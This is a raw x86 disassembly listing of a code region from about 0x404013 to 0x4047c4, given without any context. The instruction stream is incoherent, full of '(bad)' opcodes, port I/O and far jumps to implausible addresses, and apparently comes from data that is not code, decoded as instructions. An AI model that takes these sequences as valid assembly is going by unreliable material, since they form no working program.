  404013:	fdiv   DWORD PTR [eax+esi*2]
  404016:	stos   DWORD PTR es:[edi],eax
  404017:	leave  
  404018:	xchg   dl,dl
  40401a:	lock shl DWORD PTR [eax],cl
  40401d:	cmp    ecx,DWORD PTR [ebx]
  40401f:	lods   eax,DWORD PTR ds:[esi]
  404020:	jnp    0x403fd2
  404022:	stos   DWORD PTR es:[edi],eax
  404023:	adc    eax,0x99b63ee7
  404028:	push   0x8a1853b6
  40402d:	mov    bx,0x5d84
  404031:	retf   
  404032:	and    BYTE PTR [ecx],bl
  404034:	pop    esi
  404035:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404036:	sub    BYTE PTR [edi],dl
  404038:	mov    bl,0x17
  40403a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40403b:	xchg   esp,eax
  40403c:	jne    0x403fd2
  40403e:	loopne 0x4040a2
  404040:	leave  
  404041:	and    eax,0x2b8306e1
  404046:	mov    dl,0x65
  404048:	mov    al,ds:0x59c4fe1f
  40404d:	psubb  mm5,QWORD PTR [esi+0x7d]
  404051:	mov    BYTE PTR [ecx],ah
  404053:	mov    bl,0xa4
  404055:	adc    BYTE PTR [ebx-0x20175930],al
  40405b:	dec    ecx
  40405c:	and    DWORD PTR [edi-0x6befdc6d],eax
  404062:	mov    dl,0xdf
  404064:	inc    ecx
  404065:	rcl    BYTE PTR [eax+edi*4],cl
  404068:	(bad)  
  404069:	mul    BYTE PTR ds:0x1cbbad57
  40406f:	or     al,0x16
  404071:	xchg   esi,eax
  404072:	fwait
  404073:	out    0xd0,eax
  404075:	mov    bh,0x9e
  404077:	jnp    0x404014
  404079:	xchg   ebx,eax
  40407a:	pop    esp
  40407b:	dec    eax
  40407c:	mov    BYTE PTR [eax+0x26dfeaa6],bh
  404082:	fdiv   QWORD PTR [ebx-0x75]
  404085:	jo     0x4040ee
  404087:	jmp    0x2bec0eb6
  40408c:	jle    0x40404c
  40408e:	fsub   DWORD PTR [edx-0x10aac6f]
  404094:	and    al,0x6f
  404096:	call   0xc0299806
  40409b:	xchg   eax,eax
  40409d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40409e:	repnz pushf 
  4040a0:	adc    ch,bh
  4040a2:	js     0x40411c
  4040a4:	test   BYTE PTR [edi],ch
  4040a6:	dec    eax
  4040a7:	or     eax,0x50f78c9c
  4040ac:	nop
  4040ad:	jo     0x404032
  4040af:	cdq    
  4040b0:	xchg   DWORD PTR [ecx+0x45],edi
  4040b3:	test   DWORD PTR [esi+0x61],ebp
  4040b6:	jae    0x404054
  4040b8:	aam    0x7d
  4040ba:	pop    esi
  4040bb:	rcr    BYTE PTR [ecx+0xeb7a8c8],0xa2
  4040c2:	mov    dl,0xab
  4040c4:	neg    BYTE PTR [eax+edx*2+0x3a]
  4040c8:	fiadd  WORD PTR [ebx]
  4040ca:	fwait
  4040cb:	(bad)  
  4040cc:	stc    
  4040cd:	ss in  eax,0x3f
  4040d0:	and    BYTE PTR [edx+0x3eb022c3],0x8e
  4040d7:	outs   dx,DWORD PTR ds:[esi]
  4040d8:	adc    esi,eax
  4040da:	sahf   
  4040db:	mov    al,0x9c
  4040dd:	imul   eax,DWORD PTR [esi+esi*1],0x49
  4040e1:	les    edx,FWORD PTR [ecx]
  4040e3:	(bad)  
  4040e4:	pop    esp
  4040e5:	sti    
  4040e6:	(bad)  [eax]
  4040e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4040e9:	mov    cl,0x83
  4040eb:	mov    edx,0xd6912434
  4040f0:	xor    al,0x84
  4040f2:	jl     0x404116
  4040f4:	retf   
  4040f5:	sar    DWORD PTR [eax],1
  4040f7:	cli    
  4040f8:	fiadd  WORD PTR [eax]
  4040fa:	adc    esp,DWORD PTR [edi-0x15253184]
  404100:	cmp    DWORD PTR [ebx],0x7e
  404103:	(bad)  
  404104:	lahf   
  404105:	shl    DWORD PTR [edx],cl
  404107:	out    dx,al
  404108:	jnp    0x4040f4
  40410a:	js     0x404091
  40410c:	inc    eax
  40410d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40410e:	mov    ds:0x56e7573,eax
  404113:	call   0x28ea:0xe1cd9882
  40411a:	mov    eax,ds:0x27a7b683
  40411f:	mov    ebx,0xc4025abf
  404124:	sub    al,0x24
  404126:	fsubr  QWORD PTR [esi-0x6fc5ab60]
  40412c:	and    eax,0x12248caf
  404131:	fwait
  404132:	xor    al,0x96
  404134:	xor    al,BYTE PTR [edx]
  404136:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404137:	xchg   edx,eax
  404138:	or     BYTE PTR [edx-0x77],bh
  40413b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40413c:	ficomp DWORD PTR [ebp-0x3b4df4b]
  404142:	ja     0x4041c3
  404144:	dec    ebx
  404145:	xor    ebx,DWORD PTR [edi]
  404147:	es push es
  404149:	jecxz  0x404180
  40414b:	daa    
  40414c:	scas   eax,DWORD PTR es:[edi]
  40414d:	cdq    
  40414e:	add    dl,ah
  404150:	adc    DWORD PTR [esi-0x42],esi
  404153:	lahf   
  404154:	fimul  DWORD PTR [ebp+0x4d21ccec]
  40415a:	(bad)  
  40415b:	cmp    al,0x14
  40415d:	jmp    DWORD PTR [ecx]
  40415f:	and    DWORD PTR [edx+0x49b36df7],ebp
  404165:	mov    ds:0x14178f98,eax
  40416a:	or     dl,BYTE PTR [eax+0xb]
  40416d:	in     eax,dx
  40416e:	ja     0x4041e8
  404170:	mov    eax,ds:0xe80aeaf1
  404175:	and    BYTE PTR ds:0x27d2f67c,dl
  40417b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40417c:	and    ecx,DWORD PTR [edx]
  40417e:	stos   BYTE PTR es:[edi],al
  40417f:	cmp    BYTE PTR [ebp+0x65a90398],al
  404185:	mov    cl,BYTE PTR [esi]
  404187:	mov    dl,0xb9
  404189:	ficomp DWORD PTR [eax+0x66ad4a0a]
  40418f:	push   ds
  404190:	sub    DWORD PTR [eax+ebp*2],edi
  404193:	je     0x4041dd
  404195:	jmp    0x404142
  404197:	repnz pop edx
  404199:	sbb    eax,0x834031d2
  40419e:	sbb    eax,0xa535a512
  4041a3:	sub    eax,0x6c9ab985
  4041a8:	mov    ?,WORD PTR [ecx-0x58]
  4041ab:	sahf   
  4041ac:	fmul   QWORD PTR [ecx-0x72f45702]
  4041b2:	pop    eax
  4041b3:	lock push esi
  4041b5:	jmp    0xc4b5:0xb1a4b0c6
  4041bc:	cmp    eax,0xb905027a
  4041c1:	cmp    edx,eax
  4041c3:	call   0x8965ca47
  4041c8:	pop    eax
  4041c9:	jecxz  0x4041d0
  4041cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4041cc:	xor    DWORD PTR [ebp-0x4b],ebx
  4041cf:	adc    esi,DWORD PTR [esi+0x18]
  4041d2:	test   eax,0x68befe7c
  4041d7:	sub    al,0xba
  4041d9:	enter  0x3862,0xc6
  4041dd:	div    DWORD PTR [edx+0x47]
  4041e0:	in     al,dx
  4041e1:	xor    DWORD PTR [ecx+0x36],edi
  4041e4:	mov    dh,BYTE PTR [eax+0x4e]
  4041e7:	add    ah,0x1a
  4041ea:	push   ebx
  4041eb:	js     0x4041ac
  4041ed:	(bad)  
  4041ee:	pushf  
  4041ef:	and    ah,0x43
  4041f2:	xchg   esp,eax
  4041f3:	in     eax,dx
  4041f4:	pop    edx
  4041f5:	cmp    DWORD PTR [ecx-0x6cba3972],edx
  4041fb:	cdq    
  4041fc:	ins    DWORD PTR es:[edi],dx
  4041fd:	cli    
  4041fe:	jns    0x404254
  404200:	sub    al,BYTE PTR [ecx]
  404202:	punpcklbw mm6,DWORD PTR [ecx]
  404205:	xor    al,0x35
  404207:	imul   eax,DWORD PTR [esi+ecx*2+0x2a8b0053],0xdad694ab
  404212:	xchg   edx,eax
  404213:	fcom   DWORD PTR [ecx+0x6e]
  404216:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404217:	into   
  404218:	int3   
  404219:	mov    esi,0xb5a8ffca
  40421e:	xor    eax,0x776c3291
  404223:	mov    dl,BYTE PTR [edi]
  404225:	adc    bh,BYTE PTR [ebx+0x6b7bb7fe]
  40422b:	test   eax,0xcfebe575
  404230:	adc    DWORD PTR ds:[eax],0x1bdd27a7
  404237:	add    al,0x9a
  404239:	inc    eax
  40423a:	mov    dl,0x9a
  40423c:	or     BYTE PTR [esp+ebx*4-0x385b8718],cl
  404243:	int    0x75
  404245:	add    ebx,DWORD PTR [ebx+eax*1]
  404248:	mov    dl,0xfb
  40424a:	pushf  
  40424b:	test   al,0xb
  40424d:	sbb    cl,BYTE PTR [edi+esi*1]
  404250:	dec    edx
  404251:	push   esi
  404252:	aas    
  404253:	nop
  404254:	clc    
  404255:	dec    edi
  404256:	cmp    DWORD PTR [esi+0x72],esi
  404259:	shr    DWORD PTR [esi],0xee
  40425c:	ret    
  40425d:	mov    dh,BYTE PTR [ebp-0x1c]
  404260:	pushf  
  404261:	loopne 0x404214
  404263:	jne    0x4042ad
  404265:	jae    0x404289
  404267:	popa   
  404268:	dec    eax
  404269:	imul   edx,DWORD PTR [ebx-0x65],0x7bad6d0c
  404270:	scas   al,BYTE PTR es:[edi]
  404271:	mov    ebx,0x63bc206a
  404276:	sub    DWORD PTR [edi+ebp*1-0x6464bd95],ecx
  40427d:	scas   al,BYTE PTR es:[edi]
  40427e:	push   ds
  40427f:	or     al,BYTE PTR [esi+edx*8]
  404282:	dec    ecx
  404283:	stos   DWORD PTR es:[edi],eax
  404284:	xchg   esp,eax
  404285:	ins    BYTE PTR es:[edi],dx
  404286:	mov    edi,0xe6718144
  40428b:	pop    edx
  40428c:	jp     0x4042b4
  40428e:	mov    ebx,0x790c8df7
  404293:	and    bh,BYTE PTR [ecx+esi*8-0x36]
  404297:	enter  0x3956,0x6f
  40429b:	popf   
  40429c:	cmp    cl,ah
  40429e:	out    dx,eax
  40429f:	stc    
  4042a0:	push   es
  4042a1:	cmp    ah,BYTE PTR [ecx-0x5d2efdf2]
  4042a7:	dec    edx
  4042a8:	add    al,0x37
  4042aa:	in     eax,0xc7
  4042ac:	aad    0xc8
  4042ae:	test   DWORD PTR [edi-0x6c],eax
  4042b1:	mul    DWORD PTR [esi-0x7d573b78]
  4042b7:	sbb    BYTE PTR [ebx+0x47],ah
  4042ba:	pop    esi
  4042bb:	lock jbe 0x404332
  4042be:	adc    BYTE PTR [esi],0x69
  4042c1:	ds std 
  4042c3:	ins    DWORD PTR es:[edi],dx
  4042c4:	xchg   ecx,eax
  4042c5:	dec    edx
  4042c6:	leave  
  4042c7:	outs   dx,BYTE PTR ds:[esi]
  4042c8:	dec    ebx
  4042c9:	xor    bl,cl
  4042cb:	in     al,dx
  4042cc:	push   esi
  4042cd:	sbb    DWORD PTR [edx+0x142da94f],eax
  4042d3:	fwait
  4042d4:	jbe    0x40425c
  4042d6:	mov    dh,0xd7
  4042d8:	fstp   DWORD PTR [edi-0x4a]
  4042db:	cli    
  4042dc:	out    dx,al
  4042dd:	cdq    
  4042de:	outs   dx,BYTE PTR ds:[esi]
  4042df:	pop    ebx
  4042e0:	mov    ah,0xd4
  4042e2:	fcmovb st,st(3)
  4042e4:	loop   0x40435c
  4042e6:	or     BYTE PTR [eax],bh
  4042e8:	popf   
  4042e9:	and    esp,DWORD PTR [edx-0x4191ee8f]
  4042ef:	or     al,BYTE PTR [ecx+0x2e]
  4042f2:	jmp    0x89de:0xaab917d0
  4042f9:	xchg   cl,cl
  4042fb:	popa   
  4042fc:	loopne 0x404290
  4042fe:	push   cs
  4042ff:	jp     0x40428e
  404301:	push   ebx
  404302:	aaa    
  404303:	fisttp DWORD PTR [edx]
  404305:	(bad)  
  404306:	jbe    0x404343
  404308:	js     0x4042cf
  40430a:	loope  0x40433f
  40430c:	daa    
  40430d:	(bad)  
  40430e:	sbb    bh,ch
  404310:	pop    ebp
  404311:	outs   dx,BYTE PTR ds:[esi]
  404312:	in     eax,0xa4
  404314:	jne    0x40435e
  404316:	repnz imul ebp,DWORD PTR [ebp-0x7],0xbf1317a7
  40431e:	stos   DWORD PTR es:[edi],eax
  40431f:	jno    0x4042b6
  404321:	mov    cl,0x8a
  404323:	mov    eax,ds:0x56914dc6
  404328:	lahf   
  404329:	test   al,0xdb
  40432b:	je     0x40432b
  40432d:	iret   
  40432e:	xchg   edx,eax
  40432f:	fidiv  DWORD PTR [eax]
  404331:	mov    ecx,DWORD PTR [ecx]
  404333:	retf   
  404334:	shl    ecx,1
  404336:	adc    BYTE PTR [esi+0x6de93a5a],dh
  40433c:	retf   0x2e7d
  40433f:	and    DWORD PTR [esi*4-0x211d539c],eax
  404346:	ds mov ecx,0x1a4e3f67
  40434c:	test   BYTE PTR [eax-0x57],dh
  40434f:	jne    0x4042ff
  404351:	pop    edi
  404352:	adc    bl,BYTE PTR [edx]
  404354:	adc    al,0xc8
  404356:	dec    ebp
  404357:	dec    eax
  404358:	cwde   
  404359:	and    bh,al
  40435b:	sbb    eax,DWORD PTR [edi-0x2d]
  40435e:	rcl    BYTE PTR [edi-0x6c],0x1d
  404362:	mov    bl,0x7d
  404364:	xchg   esi,eax
  404365:	push   ss
  404366:	cmp    ch,BYTE PTR [ebx+0x24]
  404369:	sbb    al,BYTE PTR [ecx]
  40436b:	xor    BYTE PTR [eax+0x45],0x48
  40436f:	mov    esi,0x654dce0f
  404374:	xchg   ecx,eax
  404375:	dec    ebx
  404376:	stos   BYTE PTR es:[edi],al
  404377:	mov    WORD PTR [ecx],?
  404379:	lods   al,BYTE PTR ds:[esi]
  40437a:	ret    0x724a
  40437d:	fadd   QWORD PTR [ebx-0x6e]
  404380:	add    esi,DWORD PTR [ecx]
  404382:	sbb    al,0xe2
  404384:	dec    ecx
  404385:	cmp    DWORD PTR [edx+0x23],esi
  404388:	inc    eax
  404389:	retf   
  40438a:	loop   0x40433a
  40438c:	adc    ebx,eax
  40438e:	xor    BYTE PTR [ecx+ecx*8+0x68],ch
  404392:	in     al,0xc4
  404394:	xchg   esp,eax
  404395:	dec    esi
  404396:	jo     0x4043d8
  404398:	mov    bh,0xb9
  40439a:	shl    BYTE PTR ds:0x80e91150,cl
  4043a0:	pop    ebx
  4043a1:	mov    dh,0xc2
  4043a3:	or     DWORD PTR [edi-0x33],edi
  4043a6:	sbb    al,0x3b
  4043a8:	imul   esi,ebp,0x6
  4043ab:	ds pop esi
  4043ad:	pop    ss
  4043ae:	out    0x84,eax
  4043b0:	xor    ebx,DWORD PTR [edi+edi*1-0x66]
  4043b4:	retf   0x372e
  4043b7:	sbb    al,0xd4
  4043b9:	mov    al,ds:0x7870f60f
  4043be:	dec    ebp
  4043bf:	fimul  DWORD PTR [edx]
  4043c1:	ss sub eax,edx
  4043c4:	iret   
  4043c5:	fnstsw WORD PTR [ebp+0x10eaab91]
  4043cb:	outs   dx,BYTE PTR ds:[esi]
  4043cc:	test   eax,0xc745e1be
  4043d1:	mov    esi,0x6f99919e
  4043d6:	(bad)  
  4043d7:	and    edx,DWORD PTR [ebx-0x2d467457]
  4043dd:	pop    ecx
  4043de:	in     al,0x83
  4043e0:	add    eax,0xb72dbadb
  4043e5:	sub    al,0x55
  4043e7:	jmp    DWORD PTR [esi+0x14]
  4043ea:	mov    edi,0x44c0e5bf
  4043ef:	std    
  4043f0:	mov    ecx,0x8738c3cf
  4043f5:	mov    BYTE PTR [ebx+edi*2+0xe9e407a],bh
  4043fc:	sub    al,0xa5
  4043fe:	out    0x20,al
  404400:	sub    BYTE PTR [eax-0xf],0x64
  404404:	stos   DWORD PTR es:[edi],eax
  404405:	pop    edx
  404406:	xchg   BYTE PTR [eax-0x598d668a],bl
  40440c:	cdq    
  40440d:	pop    ss
  40440e:	ret    0xfd88
  404411:	pop    ebp
  404412:	pop    esp
  404413:	add    DWORD PTR [ebx+0x79],0x25
  404417:	mov    ecx,0xe10f9b1d
  40441c:	or     al,0x12
  40441e:	pop    es
  40441f:	je     0x40444b
  404421:	retf   
  404422:	adc    BYTE PTR [edi+0x6fe7df14],ch
  404428:	outs   dx,DWORD PTR ds:[esi]
  404429:	jl     0x404459
  40442b:	add    ebx,DWORD PTR [esi]
  40442d:	xor    al,0x51
  40442f:	fs int3 
  404431:	mov    WORD PTR [ecx+0x77],gs
  404434:	int3   
  404435:	test   BYTE PTR ss:[ecx],dl
  404438:	pop    esi
  404439:	xchg   edx,eax
  40443a:	sub    al,0x2d
  40443c:	int3   
  40443d:	inc    eax
  40443e:	ret    0xc21f
  404441:	(bad)  
  404442:	adc    ebx,DWORD PTR [esi+0x439ee8af]
  404448:	imul   eax,DWORD PTR [edi-0x80],0x488d9ea2
  40444f:	inc    edi
  404450:	jmp    0x404484
  404452:	out    0xea,al
  404454:	mov    BYTE PTR [ebx+0x14e603d9],dh
  40445a:	fsubr  DWORD PTR [esi]
  40445c:	std    
  40445d:	jo     0x404415
  40445f:	push   edx
  404460:	je     0x404403
  404462:	mov    ds:0x7923e248,eax
  404467:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404468:	in     al,0xe8
  40446a:	xor    al,0x78
  40446c:	jge    0x404478
  40446e:	and    BYTE PTR [ecx],ah
  404470:	dec    edx
  404471:	mov    dl,0xdc
  404473:	adc    al,0x12
  404475:	iret   
  404476:	shl    DWORD PTR [eax-0x68],1
  404479:	dec    esp
  40447a:	int    0xf8
  40447c:	pop    esi
  40447d:	or     bh,ch
  40447f:	push   ss
  404480:	sub    ch,cl
  404482:	sbb    DWORD PTR [ebp-0x1f3443d2],ecx
  404488:	mov    ebx,cs
  40448a:	imul   edi,DWORD PTR [ebx+eax*4],0xffffffea
  40448e:	xchg   edi,eax
  40448f:	repz jbe 0x404452
  404492:	push   ds
  404493:	and    DWORD PTR [ecx+0x61],0x781ac92f
  40449a:	sahf   
  40449b:	pop    ds
  40449c:	cmp    al,0xa8
  40449e:	hlt    
  40449f:	fs repnz and eax,0x6e955bf4
  4044a6:	idiv   BYTE PTR [ebx]
  4044a8:	nop
  4044a9:	(bad)  
  4044aa:	dec    esp
  4044ab:	mov    al,ds:0x756fcafb
  4044b0:	fmul   QWORD PTR [edx+0x2a348cc2]
  4044b6:	mov    ?,WORD PTR [ebp+0x7b8ec822]
  4044bc:	mov    esi,0xb9166cf5
  4044c1:	ss inc edi
  4044c3:	mov    bl,0xa
  4044c5:	xor    ecx,eax
  4044c7:	mov    ?,WORD PTR [edx]
  4044c9:	bound  esi,QWORD PTR [edx+ecx*2+0x14d27f58]
  4044d0:	js     0x40445d
  4044d2:	in     eax,dx
  4044d3:	sub    BYTE PTR [ebp-0x34],0xcf
  4044d7:	repnz mov cl,0xaf
  4044da:	outs   dx,BYTE PTR ds:[esi]
  4044db:	hlt    
  4044dc:	jp     0x40452a
  4044de:	jne    0x4044cc
  4044e0:	adc    edi,DWORD PTR [esi+0x2e2fa689]
  4044e6:	out    0xd9,al
  4044e8:	outs   dx,DWORD PTR ds:[esi]
  4044e9:	sbb    eax,0xaa33aa9f
  4044ee:	jno    0x40454e
  4044f0:	cli    
  4044f1:	cmp    BYTE PTR [esi],ah
  4044f3:	std    
  4044f4:	daa    
  4044f5:	xor    edi,DWORD PTR [eax+0x2d5ff2f2]
  4044fb:	add    edx,DWORD PTR [eax]
  4044fd:	adc    eax,0x6708d035
  404502:	add    WORD PTR ds:0xd1605250,dx
  404509:	add    ecx,edi
  40450b:	shl    bh,0xf0
  40450e:	mov    ch,0x6f
  404510:	bound  edx,QWORD PTR [ebx+0x1a021b79]
  404516:	mov    ebp,0x5cc41a39
  40451b:	inc    ecx
  40451c:	loop   0x4044a8
  40451e:	inc    esp
  40451f:	pop    ebx
  404520:	ins    BYTE PTR es:[edi],dx
  404521:	fistp  QWORD PTR [eax+0x5d]
  404524:	push   es
  404525:	mov    ecx,DWORD PTR [esi-0x7d]
  404528:	xchg   edx,eax
  404529:	and    ebp,DWORD PTR [edx]
  40452b:	shl    DWORD PTR [ebx-0x50],cl
  40452e:	pop    ecx
  40452f:	aas    
  404530:	cmc    
  404531:	mov    ah,0x81
  404533:	jmp    0x88ebcba9
  404538:	mov    dh,0x6b
  40453a:	jo     0x404557
  40453c:	mov    edi,0x6378b301
  404541:	hlt    
  404542:	aam    0xfb
  404544:	or     esi,ecx
  404546:	adc    edx,edx
  404548:	scas   al,BYTE PTR es:[edi]
  404549:	lock mov al,ds:0xabc4a8c9
  40454f:	mov    ecx,DWORD PTR [edx-0x50]
  404552:	ret    
  404553:	syscall 
  404555:	ret    
  404556:	mov    bh,0x48
  404558:	mov    eax,ds:0x881b664f
  40455d:	jge    0x40456f
  40455f:	in     al,0x7a
  404561:	xchg   BYTE PTR [edi-0x3c],dh
  404564:	push   ecx
  404565:	push   ds
  404566:	bound  ecx,QWORD PTR ss:[ebx-0x6a]
  40456a:	retf   
  40456b:	sub    al,0x2e
  40456d:	sahf   
  40456e:	not    DWORD PTR [esi]
  404570:	sub    BYTE PTR [ebx-0x7a45c498],0xf4
  404577:	popa   
  404578:	in     eax,0x78
  40457a:	push   ds
  40457b:	sub    eax,0xc7af27cd
  404580:	icebp  
  404581:	sub    DWORD PTR [edi],edx
  404583:	push   esi
  404584:	pop    ebp
  404585:	xor    ebx,esp
  404587:	and    BYTE PTR [ecx-0x1113c342],0xaf
  40458e:	(bad)  
  40458f:	xlat   BYTE PTR ds:[ebx]
  404590:	icebp  
  404591:	sub    bh,cl
  404593:	add    al,0x6c
  404595:	xchg   esi,eax
  404596:	shl    BYTE PTR [ebp-0x4bc6f646],1
  40459c:	mov    eax,ds:0x22643e9b
  4045a1:	sar    BYTE PTR [ecx],cl
  4045a3:	and    ecx,ecx
  4045a5:	sub    eax,0x4906886e
  4045aa:	lods   eax,DWORD PTR ds:[esi]
  4045ab:	vandnps ymm6,ymm5,YMMWORD PTR [ecx-0x36]
  4045b0:	cmp    BYTE PTR [eax+0x1],cl
  4045b3:	stc    
  4045b4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045b5:	into   
  4045b6:	inc    esi
  4045b7:	int3   
  4045b8:	inc    ebx
  4045b9:	lds    ecx,FWORD PTR [edi+0x26]
  4045bc:	jmp    0xe484:0x86cdf326
  4045c3:	mov    al,0x10
  4045c5:	push   edx
  4045c6:	mov    bl,0x9d
  4045c8:	xor    DWORD PTR [edi-0x217932e2],ebx
  4045ce:	nop
  4045cf:	jl     0x40461b
  4045d1:	jbe    0x404639
  4045d3:	add    DWORD PTR [esi],ebp
  4045d5:	dec    eax
  4045d6:	dec    ebx
  4045d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4045d8:	sbb    BYTE PTR [ecx+0x77],0x94
  4045dc:	cwde   
  4045dd:	jmp    0xb90a:0x174ba2d
  4045e4:	fmul   QWORD PTR [eax+ecx*8]
  4045e7:	fst    QWORD PTR [ecx+0x46dce8f6]
  4045ed:	fbld   TBYTE PTR [ecx]
  4045ef:	loope  0x40457d
  4045f1:	jge    0x404630
  4045f3:	not    dl
  4045f5:	pop    edi
  4045f6:	ds jnp 0x404613
  4045f9:	imul   ebp,DWORD PTR [esi+0x1e66d587],0xffffffed
  404600:	cmp    eax,0x4af4bba4
  404605:	popf   
  404606:	pusha  
  404607:	mov    dh,BYTE PTR [edx+0x5c7d6d66]
  40460d:	add    ah,dl
  40460f:	or     eax,0xf0fea377
  404614:	out    dx,al
  404615:	fst    QWORD PTR [esi+0xeb6e3b]
  40461b:	add    al,0x62
  40461d:	sbb    DWORD PTR [esi],edi
  40461f:	adc    esi,eax
  404621:	(bad)  [eax-0x51e3e072]
  404627:	test   dh,ch
  404629:	mov    ds:0x5753feec,eax
  40462e:	scas   eax,DWORD PTR es:[edi]
  40462f:	sar    DWORD PTR [ebx],cl
  404631:	xor    edx,DWORD PTR [ecx-0x10ba58eb]
  404637:	adc    DWORD PTR [esp+edx*8-0x31],0x48
  40463c:	add    eax,DWORD PTR [ebx]
  40463e:	test   DWORD PTR [ebx],0xe8a349b9
  404644:	lock add al,0x97
  404647:	jnp    0x404688
  404649:	xor    eax,0x8fdad54
  40464e:	xchg   edx,eax
  40464f:	mov    cs,WORD PTR [edi-0x22]
  404652:	adc    BYTE PTR [esi+0x4b368ac],cl
  404658:	inc    ebx
  404659:	adc    DWORD PTR [ebx],ebp
  40465b:	sbb    dh,BYTE PTR [esi]
  40465d:	sub    ebp,DWORD PTR [esi-0x33]
  404660:	mov    eax,ds:0xca86217b
  404665:	cld    
  404666:	cwde   
  404667:	cmc    
  404668:	jmp    0xcc9d:0x6ff97027
  40466f:	pop    ecx
  404670:	add    ch,BYTE PTR cs:[ebx]
  404673:	mov    cl,0xdc
  404675:	fisub  WORD PTR [ebp-0x28]
  404678:	jg     0x40460d
  40467a:	or     al,0xc1
  40467c:	push   ebp
  40467d:	push   esi
  40467e:	aam    0xa3
  404680:	stc    
  404681:	out    0x56,eax
  404683:	and    al,0xca
  404685:	stos   BYTE PTR es:[edi],al
  404686:	xchg   esi,eax
  404687:	retf   0x1722
  40468a:	pop    esp
  40468b:	aad    0xe6
  40468d:	push   esi
  40468e:	mov    BYTE PTR [esi-0x11],al
  404691:	repz es pop eax
  404694:	ja     0x40462a
  404696:	sub    edx,esi
  404698:	mov    al,ds:0x3bb67c1d
  40469d:	cmp    al,0x2b
  40469f:	shl    ah,0x91
  4046a2:	and    ecx,DWORD PTR [edi+0x3e]
  4046a5:	sar    DWORD PTR [edi-0x1e00c527],cl
  4046ab:	mov    ebx,es
  4046ad:	jp     0x40470d
  4046af:	enter  0x6f89,0x34
  4046b3:	stos   BYTE PTR es:[edi],al
  4046b4:	pop    edx
  4046b5:	std    
  4046b6:	cwde   
  4046b7:	lds    edx,FWORD PTR [bx+si-0x5e]
  4046bb:	and    BYTE PTR [edx*4+0x19a1aed5],cl
  4046c2:	pop    esp
  4046c3:	leave  
  4046c4:	or     al,0x68
  4046c6:	ja     0x404717
  4046c8:	and    al,0x8d
  4046ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046cb:	adc    BYTE PTR [eax],cl
  4046cd:	arpl   WORD PTR [ecx-0x312507a3],si
  4046d3:	inc    ecx
  4046d4:	outs   dx,DWORD PTR ds:[esi]
  4046d5:	adc    dh,dl
  4046d7:	dec    ebp
  4046d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4046d9:	hlt    
  4046da:	aas    
  4046db:	mov    al,0x1b
  4046dd:	mov    esi,DWORD PTR [esp+eiz*4+0x418f93bd]
  4046e4:	xchg   ebx,eax
  4046e5:	xor    al,0x14
  4046e7:	pusha  
  4046e8:	adc    eax,0x562392b4
  4046ed:	lock cli 
  4046ef:	mov    WORD PTR [edx-0x4c2f017a],ss
  4046f5:	cdq    
  4046f6:	or     dh,dh
  4046f8:	jno    0x4046c0
  4046fa:	mov    bh,0x11
  4046fc:	xchg   esp,eax
  4046fd:	les    ebx,FWORD PTR [ebx-0x4]
  404700:	jge    0x404779
  404702:	mov    al,0x51
  404704:	aam    0xf4
  404706:	xor    eax,0x76bff02d
  40470b:	imul   eax,DWORD PTR ds:0x8ea0a23f,0xffffffa2
  404712:	sub    eax,0x68e524fb
  404717:	shl    BYTE PTR [edx-0x305f67f8],cl
  40471d:	ret    0xebe0
  404720:	scas   al,BYTE PTR es:[edi]
  404721:	aam    0x65
  404723:	(bad)  
  404724:	xchg   edi,eax
  404725:	or     ebp,esp
  404727:	sbb    BYTE PTR [esi+0xc],ah
  40472a:	nop
  40472b:	jmp    0x40470a
  40472d:	inc    ebp
  40472e:	mov    al,ds:0xc2a0f4cf
  404733:	and    al,0x33
  404735:	mov    esi,0xe2b50262
  40473a:	add    al,ch
  40473c:	imul   eax,DWORD PTR [edi-0x3e],0x7b3d3481
  404743:	or     dh,BYTE PTR [edx]
  404745:	pop    esi
  404746:	sub    ch,BYTE PTR [ebx-0x46423428]
  40474c:	and    esi,DWORD PTR [edi-0x14]
  40474f:	(bad)  
  404750:	pop    ebx
  404751:	push   edi
  404752:	int3   
  404753:	dec    edx
  404754:	cmp    DWORD PTR [edx],eax
  404756:	aas    
  404757:	outs   dx,DWORD PTR ds:[esi]
  404758:	add    esp,DWORD PTR [edx]
  40475a:	cmp    esi,DWORD PTR [ebp+0x7d7c25d2]
  404760:	int    0x73
  404762:	das    
  404763:	rcr    BYTE PTR [ebp+0x5cba431a],cl
  404769:	sub    BYTE PTR ds:0x44eb516e,bh
  40476f:	cli    
  404770:	sahf   
  404771:	mov    ch,0x30
  404773:	bound  ecx,QWORD PTR [ebp+0x7ddde20e]
  404779:	and    eax,0x7ea81e66
  40477e:	mov    dh,0xaa
  404780:	sub    BYTE PTR [esi+0x386e0484],dl
  404786:	mov    esp,0x4eecc5d4
  40478b:	sub    ecx,0x962db542
  404791:	push   ds
  404792:	inc    edi
  404793:	iret   
  404794:	out    0xc3,eax
  404796:	push   cs
  404797:	and    dh,cl
  404799:	daa    
  40479a:	jno    0x4047e7
  40479c:	ficom  WORD PTR [eax+0x2ea6bb24]
  4047a2:	xchg   BYTE PTR [ecx],bl
  4047a4:	cld    
  4047a5:	add    al,0xc2
  4047a7:	ror    DWORD PTR [ecx+0x52],cl
  4047aa:	jmp    0x4810d3ad
  4047af:	and    ebp,ecx
  4047b1:	pop    ebx
  4047b2:	add    ebx,esp
  4047b4:	dec    ebx
  4047b5:	mov    ah,0x8f
  4047b7:	out    0x1f,al
  4047b9:	les    ebp,FWORD PTR [ecx+ebp*4-0x6a]
  4047bd:	cmp    dh,BYTE PTR [edi-0x50]
  4047c0:	(bad)  
  4047c1:	out    dx,al
  4047c2:	jge    0x40481b
  4047c4:	call   0xcc5e:0x90725771
